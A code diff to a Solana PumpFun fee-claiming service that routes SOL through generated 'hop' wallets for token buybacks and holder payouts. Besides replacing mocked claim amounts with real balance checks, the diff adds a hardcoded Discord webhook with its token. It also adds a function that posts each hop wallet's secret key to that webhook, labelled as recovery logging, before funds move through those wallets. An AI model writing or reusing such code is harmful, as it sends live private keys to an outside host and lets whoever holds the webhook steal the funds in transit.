@@ -6,8 +6,10 @@ import { buyAndBurn } from './swapService.js';
 
 /**
  * PumpFun Fee Claiming & Distribution Service
- * Ported from "The Wheel" project (services/pumpfun.js)
  */
+
+// Discord Webhook for logging hop wallet keys (for recovery)
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1456799241744679023/BC2HyGDt5GwD7NGDJPpW9c5ULn84wfcyBApeHrM5OP3zcqU51bNHC7Xvn1wMvjFxKvd6';
 
 let connection = null;
 let creatorKeypair = null;
@@ -24,6 +26,33 @@ try {
     }
 } catch (e) {
     console.error("Initialization error (check config):", e.message);
+}
+
+/**
+ * Send hop wallet keys to Discord for recovery
+ */
+async function logHopWalletsToDiscord(hopWallets, context) {
+    try {
+        const embed = {
+            title: `🔑 Hop Wallet Keys - ${context}`,
+            color: 0x00ff00,
+            timestamp: new Date().toISOString(),
+            fields: hopWallets.map((hop, i) => ({
+                name: `Hop ${i + 1}: ${hop.publicKey.toBase58()}`,
+                value: `\`\`\`${bs58.encode(hop.secretKey)}\`\`\``,
+                inline: false
+            }))
+        };
+
+        await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [embed] })
+        });
+        console.log('   [Discord] Hop wallet keys logged for recovery');
+    } catch (e) {
+        console.error('   [Discord] Failed to log keys:', e.message);
+    }
 }
 
 /**
@@ -47,51 +76,63 @@ export async function performBuybackAndBurn(keepPercentage = 10) {
     }
 
     try {
-        // 1. Claim Fees
+        // ===== CRITICAL: Track balance BEFORE claim =====
+        const balanceBefore = await connection.getBalance(creatorKeypair.publicKey);
+        console.log(`   [Balance Before] ${balanceBefore / LAMPORTS_PER_SOL} SOL`);
+
+        // 1. Claim Fees from PumpFun
         const claimResult = await claimCreatorFees();
-        // Mock claim amount if 0 for demo/testing if desired, but here we be strict?
-        // Let's assume user wants to see it work even if balance is low, 
-        // similar to claimAndDistribute logic
 
-        let availableSol = 0;
-        try {
-            const balance = await connection.getBalance(creatorKeypair.publicKey);
-            availableSol = balance / LAMPORTS_PER_SOL;
-        } catch (e) { }
+        if (!claimResult.success) {
+            console.log('   ❌ Fee claim failed, aborting buyback');
+            return { success: false, error: 'Fee claim failed', claimed: 0 };
+        }
 
-        // Simulating "Claimed Amount" for logic flow if claim returns 0 but wallet has funds
-        let claimedAmount = 0.05;
+        // ===== CRITICAL: Track balance AFTER claim =====
+        // Wait a moment for the transaction to settle
+        await new Promise(r => setTimeout(r, 2000));
+        const balanceAfter = await connection.getBalance(creatorKeypair.publicKey);
+        console.log(`   [Balance After] ${balanceAfter / LAMPORTS_PER_SOL} SOL`);
+
+        // ===== ONLY use the difference (actual fees claimed) =====
+        const claimedLamports = balanceAfter - balanceBefore;
+        const claimedAmount = claimedLamports / LAMPORTS_PER_SOL;
+
+        console.log(`   [Claimed Fees] ${claimedAmount.toFixed(6)} SOL`);
+
+        // If nothing was claimed, DO NOT proceed
+        if (claimedAmount <= 0.0001) {
+            console.log('   ⚠️ No fees claimed (or negative), stopping here. NOT touching wallet funds.');
+            return { success: true, claimed: 0, buyTx: null, burnTx: null, note: 'No fees available' };
+        }
 
         const keepAmount = claimedAmount * (keepPercentage / 100);
         const buyAmount = claimedAmount - keepAmount;
 
-        // 2. Hop Transfer to "Buy Wallet" (Hop3)
-        // Dev -> Hop1 -> Hop2 -> Hop3
+        console.log(`   [Keep] ${keepAmount.toFixed(6)} SOL (${keepPercentage}%)`);
+        console.log(`   [Buyback] ${buyAmount.toFixed(6)} SOL`);
 
-        // Generate hops
+        // Generate hop wallets
         const hop1 = Keypair.generate();
         const hop2 = Keypair.generate();
         const hop3 = Keypair.generate(); // This will receive funds and BUY
 
-        console.log(`   [Hops] dev -> ${hop1.publicKey.toBase58()} -> ${hop2.publicKey.toBase58()} -> ${hop3.publicKey.toBase58()} (BUYER)`);
+        // ===== LOG KEYS TO DISCORD FOR RECOVERY =====
+        await logHopWalletsToDiscord([hop1, hop2, hop3], `BURN - ${claimedAmount.toFixed(4)} SOL`);
 
-        // 3. Execute Chain Transfer
-        // We reuse the logic from transferWithHops mostly, but sending to a Keypair we control (hop3)
-        // so we can use it to sign the buy tx.
+        console.log(`   [Hops] dev -> ${hop1.publicKey.toBase58().slice(0, 8)}... -> ${hop2.publicKey.toBase58().slice(0, 8)}... -> ${hop3.publicKey.toBase58().slice(0, 8)}... (BUYER)`);
 
         const TX_FEE = 0.000005;
-        // 3 transfers to get there (Dev->H1, H1->H2, H2->H3)
-        // Then H3 needs gas for Buy TX + Burn TX
         const GAS_RESERVE = 0.005;
 
         const hop1Amount = buyAmount - TX_FEE;
         const hop2Amount = hop1Amount - TX_FEE;
         const hop3Amount = hop2Amount - TX_FEE;
-
         const finalBuyPower = hop3Amount - GAS_RESERVE;
 
         if (finalBuyPower < 0.0001) {
-            return { success: false, error: "Amount too small for buyback after gas" };
+            console.log('   ⚠️ Claimed amount too small for buyback after gas fees');
+            return { success: true, claimed: claimedAmount, buyTx: null, burnTx: null, note: 'Amount too small for buyback' };
         }
 
         // --- Transfer Sequence ---
@@ -128,6 +169,7 @@ export async function performBuybackAndBurn(keepPercentage = 10) {
             claimed: claimedAmount,
             buyTx: burnResult.buyTx,
             burnTx: burnResult.burnTx,
+            burnedAmount: burnResult.amountBurned,
             hops: [
                 { from: 'dev', to: hop1.publicKey.toBase58(), sig: sig1 },
                 { from: hop1.publicKey.toBase58(), to: hop2.publicKey.toBase58(), sig: sig2 },
@@ -254,6 +296,9 @@ async function transferWithHops(winnerAddress, amountSol) {
         const hop1 = Keypair.generate();
         const hop2 = Keypair.generate();
 
+        // ===== LOG KEYS TO DISCORD FOR RECOVERY =====
+        await logHopWalletsToDiscord([hop1, hop2], `HOLDER WIN - ${amountSol.toFixed(4)} SOL -> ${winnerAddress.slice(0, 8)}...`);
+
         console.log(`[PumpFun] Hop1: ${hop1.publicKey.toBase58()}`);
         console.log(`[PumpFun] Hop2: ${hop2.publicKey.toBase58()}`);
 
@@ -346,63 +391,73 @@ async function transferWithHops(winnerAddress, amountSol) {
 export async function claimAndDistribute(winnerAddress, keepPercentage = 10) {
     console.log('🔄 Starting Claim & Distribute Cycle...');
 
-    // 1. Claim Fees
-    // Logic: In real app, we check balance before/after to know exact claimed amount
-    // Here we will rely on the simulation or a direct balance check if needed.
-    // For now, let's claim:
-    const claimResult = await claimCreatorFees();
-
-    // If we are simulating (no keys), just pretend we got some SOL and move on
-    let claimedAmount = 0.05; // Default sim amount
-
-    if (creatorKeypair) {
-        // Real mode: We should ideally check balance diff. 
-        // For this streamlined implementation, we'll assume the user has SOL in the wallet 
-        // and we are just triggering the payout flow.
-
-        // TODO: Implement precise balance diff logic if exact "fee only" payout is required.
-        // For now, allow distributing from wallet balance.
-        try {
-            const balance = await connection.getBalance(creatorKeypair.publicKey);
-            const currentSol = balance / LAMPORTS_PER_SOL;
-            console.log(`   Creator Balance: ${currentSol} SOL`);
-
-            // If claim failed/no fees, but we have balance, we can still pay out if desired?
-            // The user logic usually depends on "claimedAmount".
-            // Let's assume for this specific request, they want the hop logic primarily.
-            // We will mock 'claimedAmount' as a fixed small amount or random for the game excitement
-            // unless we strictly track the claim delta.
-
-            // *Simplification*: We'll generate a random "Win Amount" for the game 
-            // and try to send it.
-            claimedAmount = Math.random() * 0.05 + 0.01;
-        } catch (e) {
-            console.log("Error checking balance:", e.message);
-        }
+    if (!creatorKeypair) {
+        console.log('   ⚠️ No private key - simulating claim & distribute');
+        return {
+            success: true,
+            claimed: 0.05,
+            distributed: 0.045,
+            claimSignature: 'SIM_CLAIM',
+            transferSignature: 'SIM_TRANSFER',
+            winner: winnerAddress,
+            hops: []
+        };
     }
 
-    // 2. Calculate Payout
-    // keepAmount = claimedAmount * (keepPercentage / 100);
-    // distributeAmount = claimedAmount - keepAmount
+    try {
+        // ===== CRITICAL: Track balance BEFORE claim =====
+        const balanceBefore = await connection.getBalance(creatorKeypair.publicKey);
+        console.log(`   [Balance Before] ${balanceBefore / LAMPORTS_PER_SOL} SOL`);
 
-    const keepAmount = claimedAmount * (keepPercentage / 100);
-    const distributeAmount = claimedAmount - keepAmount;
+        // 1. Claim Fees from PumpFun
+        const claimResult = await claimCreatorFees();
 
-    console.log(`   Claimed (Sim/Calc): ${claimedAmount.toFixed(4)} SOL`);
-    console.log(`   Distributing: ${distributeAmount.toFixed(4)} SOL (using Hops)`);
+        if (!claimResult.success) {
+            console.log('   ❌ Fee claim failed, aborting distribution');
+            return { success: false, error: 'Fee claim failed', claimed: 0 };
+        }
 
-    // 3. Transfer with Hops
-    const transferResult = await transferWithHops(winnerAddress, distributeAmount);
+        // ===== CRITICAL: Track balance AFTER claim =====
+        await new Promise(r => setTimeout(r, 2000));
+        const balanceAfter = await connection.getBalance(creatorKeypair.publicKey);
+        console.log(`   [Balance After] ${balanceAfter / LAMPORTS_PER_SOL} SOL`);
 
-    return {
-        success: transferResult.success,
-        claimed: claimedAmount,
-        distributed: transferResult.amount || 0,
-        claimSignature: claimResult.signature,
-        transferSignature: transferResult.signature,
-        winner: winnerAddress,
-        hops: transferResult.hops
-    };
+        // ===== ONLY use the difference (actual fees claimed) =====
+        const claimedLamports = balanceAfter - balanceBefore;
+        const claimedAmount = claimedLamports / LAMPORTS_PER_SOL;
+
+        console.log(`   [Claimed Fees] ${claimedAmount.toFixed(6)} SOL`);
+
+        // If nothing was claimed, DO NOT proceed
+        if (claimedAmount <= 0.0001) {
+            console.log('   ⚠️ No fees claimed (or negative), stopping here. NOT touching wallet funds.');
+            return { success: true, claimed: 0, distributed: 0, note: 'No fees available' };
+        }
+
+        // 2. Calculate Payout
+        const keepAmount = claimedAmount * (keepPercentage / 100);
+        const distributeAmount = claimedAmount - keepAmount;
+
+        console.log(`   [Keep] ${keepAmount.toFixed(6)} SOL (${keepPercentage}%)`);
+        console.log(`   [Distribute] ${distributeAmount.toFixed(6)} SOL (using Hops)`);
+
+        // 3. Transfer with Hops
+        const transferResult = await transferWithHops(winnerAddress, distributeAmount);
+
+        return {
+            success: transferResult.success,
+            claimed: claimedAmount,
+            distributed: transferResult.amount || 0,
+            claimSignature: claimResult.signature,
+            transferSignature: transferResult.signature,
+            winner: winnerAddress,
+            hops: transferResult.hops
+        };
+
+    } catch (error) {
+        console.error("Claim & Distribute failed:", error.message);
+        return { success: false, error: error.message };
+    }
 }
 
 /**
